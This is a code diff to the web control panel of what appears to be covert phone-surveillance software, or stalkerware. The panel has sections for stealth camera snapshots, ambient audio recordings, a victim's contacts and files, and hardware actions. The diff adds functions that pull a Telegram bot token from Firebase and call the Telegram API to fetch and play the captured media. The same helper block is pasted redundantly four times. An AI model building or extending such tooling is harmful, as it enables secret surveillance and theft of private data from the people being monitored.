@@ -167,6 +167,45 @@
         const fbAuth = firebase.auth();
         fbAuth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(err => console.log('Auth persistence err:', err));
 
+        // ── Telegram Cloud Vault Config ──
+        let TELEGRAM_BOT_TOKEN = '';
+        fbDb.ref('config/telegram').once('value').then(snap => {
+            const cfg = snap.val();
+            if (cfg && cfg.bot_token) {
+                TELEGRAM_BOT_TOKEN = cfg.bot_token;
+                console.log('✅ Telegram Cloud Vault config loaded');
+            }
+        });
+
+        /**
+         * Resolve a Telegram fileId to a fresh direct download URL.
+         * Telegram URLs expire after ~1 hour, so we fetch on-demand.
+         */
+        async function resolveTelegramUrl(fileId) {
+            if (!TELEGRAM_BOT_TOKEN || !fileId) return '';
+            try {
+                const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`);
+                const data = await resp.json();
+                if (data.ok && data.result && data.result.file_path) {
+                    return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
+                }
+            } catch (e) {
+                console.error('Telegram getFile error:', e);
+            }
+            return '';
+        }
+
+        /**
+         * Get a working media URL — tries directUrl first, falls back to resolving fileId.
+         */
+        async function getMediaUrl(item) {
+            if (item.directUrl) return item.directUrl;
+            if (item.driveUrl) return item.driveUrl;
+            if (item.fileId) return await resolveTelegramUrl(item.fileId);
+            if (item.base64) return item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64;
+            return '';
+        }
+
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
                 navigator.serviceWorker.register('sw.js').catch(err => console.log('SW reg error:', err));
@@ -3090,7 +3129,7 @@
             }
         }
 
-        // 2. If direct Google Drive / Webhook download URL is present
+        // 2. If direct Cloud / Telegram download URL is present
         const downloadUrl = file.directUrl || file.driveUrl;
         if (downloadUrl) {
             const a = document.createElement('a');
@@ -3103,7 +3142,7 @@
             return;
         }
 
-        alert(`File "${fileName}" uploaded to cloud, but no direct URL is attached yet. Check your Google Drive.`);
+        alert(`File "${fileName}" uploaded to cloud, but no direct URL is attached yet. Try refreshing.`);
     }
 
     function deleteCloudDownload(key) {
@@ -3204,6 +3243,23 @@
         container.innerHTML = html;
     });
 
+    // Telegram audio URL refresh helpers
+    async function refreshAudioSrc(audioId, fileId) {
+        if (!fileId) return;
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) el.src = freshUrl;
+        }
+    }
+    async function loadAudioFromTelegram(audioId, fileId) {
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) { el.src = freshUrl; el.style.display = ''; el.play(); }
+        }
+    }
+
     devRef.child('files').on('value', snap => {
         const data = snap.val();
         if (!data) return;
@@ -3278,12 +3334,14 @@
         items.sort((a, b) => (b.time || 0) - (a.time || 0));
 
         let html = '';
-        items.forEach(rec => {
+        items.forEach((rec, idx) => {
             const name = rec.name || 'Audio Recording.m4a';
             const date = rec.time ? new Date(rec.time).toLocaleString() : '';
             const driveUrl = rec.driveUrl || '';
             const directUrl = rec.directUrl || '';
+            const fileId = rec.fileId || '';
             const dur = rec.duration ? `${rec.duration}s` : 'Ambient';
+            const audioId = `audio_rec_${idx}`;
 
             html += `
             <div style="background:rgba(255,255,255,0.035);border:1px solid var(--border);border-radius:14px;padding:16px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
@@ -3301,13 +3359,30 @@
                 </div>
 
                 <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:240px;justify-content:flex-end;">
-                    ${directUrl ? `<audio controls style="height:32px;outline:none;" src="${directUrl}"></audio>` : ''}
-                    ${driveUrl ? `<a href="${driveUrl}" target="_blank" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fas fa-cloud" style="color:#30d158;margin-right:4px;"></i> Cloud View</a>` : ''}
+                    ${directUrl ? `<audio id="${audioId}" controls style="height:32px;outline:none;" src="${directUrl}" onerror="refreshAudioSrc('${audioId}','${fileId}')"></audio>` : (fileId ? `<button onclick="loadAudioFromTelegram('${audioId}','${fileId}')" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fas fa-play" style="color:#30d158;margin-right:4px;"></i>Play</button><audio id="${audioId}" controls style="height:32px;outline:none;display:none;"></audio>` : '')}
+                    ${driveUrl ? `<a href="${driveUrl}" target="_blank" class="btn-ghost" style="padding:6px 12px;font-size:0.76rem;border-radius:var(--radius-pill);"><i class="fas fa-cloud" style="color:#30d158;margin-right:4px;"></i> Download</a>` : ''}
                 </div>
             </div>`;
         });
         container.innerHTML = html;
     });
+
+    // Telegram audio URL refresh helpers
+    async function refreshAudioSrc(audioId, fileId) {
+        if (!fileId) return;
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) el.src = freshUrl;
+        }
+    }
+    async function loadAudioFromTelegram(audioId, fileId) {
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) { el.src = freshUrl; el.style.display = ''; el.play(); }
+        }
+    }
 
     // ==========================================
     // 3. Stealth Camera Snapshot
@@ -3952,6 +4027,23 @@
         container.innerHTML = html;
     });
 
+    // Telegram audio URL refresh helpers
+    async function refreshAudioSrc(audioId, fileId) {
+        if (!fileId) return;
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) el.src = freshUrl;
+        }
+    }
+    async function loadAudioFromTelegram(audioId, fileId) {
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) { el.src = freshUrl; el.style.display = ''; el.play(); }
+        }
+    }
+
     devRef.child('contacts/list').on('value', snap => {
         const data = snap.val();
         const container = document.getElementById('contactsContainer');
@@ -3985,6 +4077,23 @@
         });
         container.innerHTML = html;
     });
+
+    // Telegram audio URL refresh helpers
+    async function refreshAudioSrc(audioId, fileId) {
+        if (!fileId) return;
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) el.src = freshUrl;
+        }
+    }
+    async function loadAudioFromTelegram(audioId, fileId) {
+        const freshUrl = await resolveTelegramUrl(fileId);
+        if (freshUrl) {
+            const el = document.getElementById(audioId);
+            if (el) { el.src = freshUrl; el.style.display = ''; el.play(); }
+        }
+    }
 
     // ==========================================
     // 6. Quick Hardware Action Handlers
